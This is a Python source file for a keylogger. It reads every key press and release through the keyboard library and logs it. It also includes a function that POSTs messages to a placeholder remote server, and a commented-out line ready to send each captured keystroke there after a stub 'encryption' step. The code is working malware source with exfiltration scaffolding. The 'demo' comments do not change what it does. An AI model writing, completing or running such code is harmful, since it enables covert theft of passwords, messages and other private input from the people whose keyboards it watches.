import logging
import http.client
import urllib.parse
import keyboard  # Requires: pip install keyboard

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Dummy encryption key (not used in this demo)
key = b'Sixteen byte key'

def pad(data):
    """Pad data to be a multiple of 16 bytes."""
    pad_len = 16 - (len(data) % 16)
    return data + chr(pad_len) * pad_len

def encrypt_data(data):
    """Dummy encryption function for demonstration."""
    # In a real scenario, you would use AES here
    return f"encrypted({data})"

def on_key_press(key_name):
    """Handle key press event."""
    logging.info(f"Key Pressed: {key_name}")
    # Example: send_logs_to_server(encrypt_data(key_name))  # Uncomment to send logs

def send_logs_to_server(log_message):
    """Sends log message to a remote server via HTTP POST request."""
    params = {'message': log_message}
    # Replace 'your-encrypted-server.com' with your actual server address
    conn = http.client.HTTPSConnection('your-encrypted-server.com')
    conn.request(
        "POST",
        "/log",
        urllib.parse.urlencode(params),
        headers={"Content-type": "application/x-www-form-urlencoded"}
    )
    response = conn.getresponse()
    response.read()  # Ensure the response is read before closing
    conn.close()

def keylogger_loop():
    logging.info("Keylogger started. Press ESC to stop.")
    while True:
        try:
            event = keyboard.read_event()
            if event.event_type == "down":
                on_key_press(event.name)
            elif event.event_type == "up":
                logging.info('Key Released: {}'.format(event.name))
            if event.name == 'esc' and event.event_type == "down":
                logging.info("ESC pressed. Exiting keylogger.")
                break
        except Exception as e:
            logging.error(f"Unexpected error occurred: {e}")
            break

if __name__ == '__main__':
    keylogger_loop()